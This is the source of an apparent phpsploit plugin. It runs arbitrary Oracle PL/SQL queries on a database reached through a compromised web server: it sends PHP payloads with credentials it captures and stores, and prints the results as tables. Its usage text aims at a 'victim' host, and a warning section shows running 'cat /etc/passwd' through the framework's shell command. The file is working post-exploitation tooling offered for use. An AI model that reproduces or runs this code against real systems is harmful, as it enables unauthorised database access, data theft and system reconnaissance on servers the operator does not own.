"""A client for Oracle PL/SQL databases

SYNOPSIS:
    oracle connect <USERNAME>@<HOSTNAME>:<PORT>/<CONNECTOR> [-p <PASSWORD>]
    oracle "<SQL COMMAND>"

DESCRIPTION:
    Run Oracle PL/SQL commands through phpsploit.
    - The 'connect' argument estabilishes a connection with
    given credentials, which are then stored on `ORACLE_CRED`
    environment variable in order to be persistent between
    plugin calls in current session.
    - The <CONNECTOR> argument describes a 'SERVICE_NAME' OR an 'SID',
    wich are both oracle connection paradygms.
    - Any other case assumes that the arguments are an SQL
    command, and result is returned.
    - A command that ends with '\G' will use tabular
    display mode.

WARNING:
    Considering the PhpSploit's input parser, commands which
    contain quotes, semicolons, and other chars that could be
    interpreted by the framework SHALL be enquoted to be
    interpreted as a single argument. For example:
      > run echo 'foo bar' > /tmp/foobar; cat /etc/passwd
    In this case, quotes and semicolons will be interpreted by
    the framwework, so the correct syntax is:
      > run "echo 'foo bar' > /tmp/foobar; cat /etc/passwd"

EXAMPLES:
    > oracle connect root@10.0.0.100:1524/db.victim.com -p god
      - Connect to 10.0.0.100:1524/db.victim.com as "root" with password "god"
    > oracle SELECT owner, table_name FROM all_tables
      - Print the tables list
    > oracle "SELECT owner, table_name FROM all_tables\\\\G"
      - Same as above, using tabular format (mysql client like)

ENVIRONMENT:
    * ORACLE_CRED
        Oracle connection credentials

AUTHOR:
    nil0x42 <http://goo.gl/kb2wf>
"""

import sys
import time
import re
import pprint

from api import plugin
from api import server
from api import environ


def load_credentials(creds):
    """Return a dictionnary of credentials
    elements from raw format.
    """
    result = {}
    try:
        parsed = re.findall("(.+?)@(.+?):(\d+)/([^*]+)(?:\*(.+))?", creds)[0]
        assert len(parsed) == 5
        result['USER'] = parsed[0]
        result['HOST'] = parsed[1]
        result['PORT'] = parsed[2]
        result['CONNECTOR'] = parsed[3]
        result['PASS'] = parsed[4]
    except:
        sys.exit("couldn't parse ORACLE_CRED credentials: %s" % creds)
    return result

def sql_str_repr(row):
    return "NULL" if row is None else str(row)

if len(plugin.argv) < 2:
    sys.exit(plugin.help)


# `oracle connect <USERNAME>@<HOSTNAME> [-p <PASSWORD>]`
# Connect to a oracle server with credentials.
# This comment creates or updates the ORACLE_CRED
# environment variable.
if plugin.argv[1].lower() == "connect":
    if len(plugin.argv) < 3:
        sys.exit(plugin.help)
    raw_creds = plugin.argv[2]
    if len(plugin.argv) > 3:
        if plugin.argv[3] == "-p":
            password = ' '.join(plugin.argv[4:])
            raw_creds += '*' + password
    creds = load_credentials(raw_creds)
    payload = server.payload.Payload("connect.php")
    payload.update(creds)
    payload.send()
    if "ORACLE_CRED" not in environ:
        environ["ORACLE_CRED"] = ""
    if raw_creds != environ["ORACLE_CRED"]:
        environ["ORACLE_CRED"] = raw_creds

    msg = ("[*] SUCCESS: Access granted for user"
           " '%s'@'%s' (using password: %s)")
    msg %= creds["USER"], creds["HOST"], ['YES', 'NO'][not creds['PASS']]
    print(msg)
    sys.exit(0)

# check and load ORACLE_CRED environment variable
if "ORACLE_CRED" not in environ:
    sys.exit("Not connected to any server, use `oracle connect` before")
creds = load_credentials(environ["ORACLE_CRED"])

# format last oracle token correctly
plugin.argv[-1] = plugin.argv[-1].strip().rstrip(';').strip()
if plugin.argv[-1] == "":
    del plugin.argv[-1]


# `oracle "<SQL COMMAND>"`
# Run an SQL command.
sql_query = " ".join(plugin.argv[1:]).rstrip(';').strip()
if sql_query.endswith('\\G'):
    sql_query = sql_query[:-2].strip()
    display_mode = "line"
else:
    display_mode = "column"
# prepare and send payload
payload = server.payload.Payload("payload.php")
payload.update(creds)
payload["QUERY"] = sql_query
start_time = time.time()
response = payload.send()
end_time = time.time()

elapsed_time = "(%s sec)" % str(round(end_time - start_time, 2))
query_type = response[0]
affected_rows = response[1]
plural = '' if affected_rows == 1 else 's'

# Query type: SET
if query_type == "SET":
    msg = "[*] Query OK, %d row%s affected %s"
    print(msg % (affected_rows, plural, elapsed_time))
    sys.exit(0)

fields = response[2][0]
rows = response[2][1:]

# Query type: GET
if fields is None or affected_rows == 0:
    print("[*] Empty set %s" % elapsed_time)
    sys.exit(0)

# replace NoneType() values to str("NULL") in all rows
for i, row in enumerate(rows):
    rows[i] = ["NULL" if elem is None else elem for elem in row]

if display_mode == "line":
    field_space = len(max(fields, key=len))
    fields = [(' ' * (field_space - len(x))) + x for x in fields]
    header = "*************************** %d. row ***************************"
    i = 1
    for row in rows:
        print(header % i)
        j = 0
        for field in fields:
            print("%s: %s" % (field, sql_str_repr(row[j])))
            j += 1
        i += 1

elif display_mode == "column":
    columns = [[str(field)] for field in fields]
    for row in rows:
        for i in range(len(fields)):
            columns[i].append(sql_str_repr(row[i]))
    cols_len = [len(max(column, key=len)) for column in columns]
    delimiter = '+-' + ('-+-'.join(['-' * i for i in cols_len])) + '-+'
    for row_no in range(len(columns[0])):
        row = []
        for field_no in range(len(fields)):
            value = columns[field_no][row_no]
            fill = ' ' * (cols_len[field_no] - len(columns[field_no][row_no]))
            row.append(value + fill)
        if row_no < 2:
            print(delimiter)
        print('| ' + (' | '.join(row)) + ' |')
    print(delimiter)

msg = "%s row%s in set %s"
print(msg % (affected_rows, plural, elapsed_time))
sys.exit(0)
